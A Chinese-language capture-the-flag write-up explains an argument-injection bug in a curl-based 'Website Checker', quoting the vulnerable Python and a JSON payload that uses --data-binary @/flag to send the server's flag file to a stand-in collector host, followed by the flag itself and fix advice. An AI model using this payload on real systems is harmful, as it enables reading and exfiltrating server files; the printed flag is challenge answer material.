# Website Checker

## 题目简述

应用接收一个 URL 和一个 `options` 对象，然后以参数数组形式执行 `curl -i <host> ...`。它没有经过 shell，因此传统的分号或命令替换注入并不适用；但用户可以自由指定 curl 选项及其值，形成参数注入。

题面说明 flag 位于 `/flag`。curl 的 `--data-binary @文件名` 会从本地文件读取请求体，因此可以让服务器读取 `/flag`，再把内容作为 POST body 发往攻击者控制的接收端。

## 解题过程

命令构造逻辑如下：

```python
curlCommand = ['curl', '-i']

host = [request.json['host']]
assert host[0].startswith("http")
curlOptions = request.json['options']
command = curlCommand + host

for option in curlOptions:
    command.append(shlex.quote(option))
    command.append(shlex.quote(curlOptions[option]))

result = subprocess.run(command, capture_output=True)
```

`subprocess.run()` 接收的是列表，不会启动 shell。这里调用 `shlex.quote()` 既不能建立选项允许列表，也不会阻止 `--data-binary` 被 curl 解释；对于本题使用的不含空格参数，它甚至不会改变字符串。

先在可被题目服务器访问的位置启动 HTTP 请求收集器，并记下 URL。提交：

```json
{
  "host": "https://YOUR-COLLECTOR.example/upload",
  "options": {
    "--data-binary": "@/flag"
  }
}
```

服务端最终执行的参数语义为：

```text
curl -i https://YOUR-COLLECTOR.example/upload --data-binary @/flag
```

以 `@` 开头的值会让 curl 读取其后的本地路径，并原样作为请求 body 发送。应用自身只返回远端状态码，所以 flag 应在接收器记录的请求体中查看：

```text
shellmates{Curl_4nd_1t5_m4g1c4l_0Pt10n$$}
```

仓库中的实际 `/flag` 文件确认只有一个闭合花括号；官方解答末尾多写的第二个 `}` 是文档笔误。

## 方法总结

本题是命令参数注入而不是 shell 命令注入。使用参数数组和 `shell=False` 能阻止 shell 元字符执行，却不能阻止下游程序把攻击者输入解释为高权限功能选项。curl 支持本地文件读取、上传、代理、协议选择等大量能力，把任意选项开放给用户等价于暴露这些能力。

修复应完全删除用户自定义 curl 选项，或仅把少量业务参数映射为固定、安全的参数；目标 URL 也应限制协议、主机和端口并防止 SSRF。执行进程还应使用最小权限，确保即使出现参数注入也无权读取 flag、密钥或其他敏感文件。
